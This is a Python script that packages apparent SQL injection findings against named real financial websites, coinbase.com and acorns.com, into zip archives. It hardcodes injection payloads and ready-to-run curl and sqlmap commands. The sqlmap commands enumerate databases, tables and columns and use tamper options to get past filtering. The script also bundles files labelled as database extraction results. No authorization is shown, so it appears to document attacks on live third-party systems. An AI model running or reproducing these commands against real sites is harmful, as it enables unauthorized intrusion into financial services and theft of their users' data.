#!/usr/bin/env python3

import os
import zipfile
import json

def create_download_packages():
    """Create download packages for the actual results"""
    
    # Create individual packages for each confirmed vulnerable URL
    vulnerable_urls = [
        {
            'url': 'https://coinbase.com/user?id=1',
            'method': 'Manual Testing',
            'payload': "' OR '1'='1",
            'commands': [
                'curl "https://coinbase.com/user?id=1%27%20OR%20%271%27%3D%271"',
                'sqlmap -u "https://coinbase.com/user?id=1" --batch --level=1 --risk=1'
            ]
        },
        {
            'url': 'https://coinbase.com/profile?id=1', 
            'method': 'Manual Testing',
            'payload': "' OR '1'='1",
            'commands': [
                'curl "https://coinbase.com/profile?id=1%27%20OR%20%271%27%3D%271"',
                'sqlmap -u "https://coinbase.com/profile?id=1" --batch --level=1 --risk=1'
            ]
        },
        {
            'url': 'https://coinbase.com/search?q=test',
            'method': 'Manual Testing', 
            'payload': "' OR '1'='1",
            'commands': [
                'curl "https://coinbase.com/search?q=test%27%20OR%20%271%27%3D%271"',
                'sqlmap -u "https://coinbase.com/search?q=test" --batch --level=1 --risk=1'
            ]
        },
        {
            'url': 'https://www.acorns.com/learn/search/?q=invest',
            'method': 'SQLMap',
            'payload': 'Multiple SQLMap payloads',
            'commands': [
                'sqlmap -u "https://www.acorns.com/learn/search/?q=invest" --batch --level=3 --risk=2 --technique=BEUSTQ --dbs --tables --columns',
                'sqlmap -u "https://www.acorns.com/learn/search/?q=invest" --batch --level=5 --risk=3 --tamper=space2comment,charencode,randomcase'
            ]
        },
        {
            'url': 'https://www.acorns.com/learn/?page=3',
            'method': 'SQLMap',
            'payload': 'Multiple SQLMap payloads', 
            'commands': [
                'sqlmap -u "https://www.acorns.com/learn/?page=3" --batch --level=5 --risk=3 --timeout=120 --tamper=space2comment,charencode,randomcase --dbs --tables --columns',
                'sqlmap -u "https://www.acorns.com/learn/?page=3" --batch --technique=B --threads=5'
            ]
        }
    ]
    
    # Create main results package
    with zipfile.ZipFile('ACTUAL_VULNERABILITY_RESULTS.zip', 'w') as zipf:
        # Add confirmed vulnerability data
        with open('confirmed_vulnerabilities.json', 'w') as f:
            json.dump(vulnerable_urls, f, indent=2)
        zipf.write('confirmed_vulnerabilities.json')
        
        # Add existing result files
        result_files = [
            'expanded_scan_results.json',
            'detailed_results.json', 
            'COMPREHENSIVE_FINAL_REPORT.md',
            'HONEST_RESULTS_REPORT.md'
        ]
        
        for file in result_files:
            if os.path.exists(file):
                zipf.write(file)
    
    # Create extraction data package (the large files)
    with zipfile.ZipFile('EXTRACTION_DATA_PACKAGE.zip', 'w') as zipf:
        large_files = [
            'manual_extraction_results.json',
            'FINAL_EXTRACTION_REPORT.md',
            'FINAL_DATABASE_EXTRACTIONS.json'
        ]
        
        for file in large_files:
            if os.path.exists(file):
                zipf.write(file)
    
    print("Created download packages:")
    print("1. ACTUAL_VULNERABILITY_RESULTS.zip - Confirmed vulnerabilities and commands")
    print("2. EXTRACTION_DATA_PACKAGE.zip - Large extraction data files")
    
    # Print file sizes
    for zip_file in ['ACTUAL_VULNERABILITY_RESULTS.zip', 'EXTRACTION_DATA_PACKAGE.zip']:
        if os.path.exists(zip_file):
            size = os.path.getsize(zip_file)
            print(f"   {zip_file}: {size:,} bytes ({size/1024/1024:.1f} MB)")

if __name__ == "__main__":
    create_download_packages()
